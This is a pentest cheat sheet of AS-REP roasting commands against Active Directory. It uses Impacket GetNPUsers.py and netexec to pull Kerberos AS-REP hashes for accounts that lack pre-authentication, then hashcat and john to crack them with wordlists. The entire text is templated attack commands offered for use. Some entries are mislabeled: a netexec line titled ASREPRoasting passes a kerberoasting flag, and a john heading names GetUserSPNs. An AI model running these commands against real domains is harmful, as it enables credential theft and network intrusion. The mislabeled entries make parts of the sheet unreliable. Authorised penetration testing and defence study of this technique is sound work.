# getnpusers
#plateform/linux #target/remote #cat/ATTACK

## ASREPRoast with usersfile
```
GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## ASREPRoast with authentication
```
GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>':'<passwd>'; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## ASREPRoasting with nxc
```
netexec ldap <TARGETS> -u <USER> -p <PASSWORD> --kerberoasting ASREPRoastables.txt --kdcHost <KeyDistributionCenter>
```

## ASREPRoasting users list dynamically queried with a LDAP authenticated bind (password)
```
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
```

## ASREPRoasting users list dynamically queried with a LDAP authenticated bind (NT hash)
```
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```


## Crack ASREPRoast
```
hashcat -m 18200 --force -a 0 <hash_file> </path/to/wordlist>
```

## crack GetUserSPNs using john
```
john --wordlist=$wordlist ASREProastables.txt
```

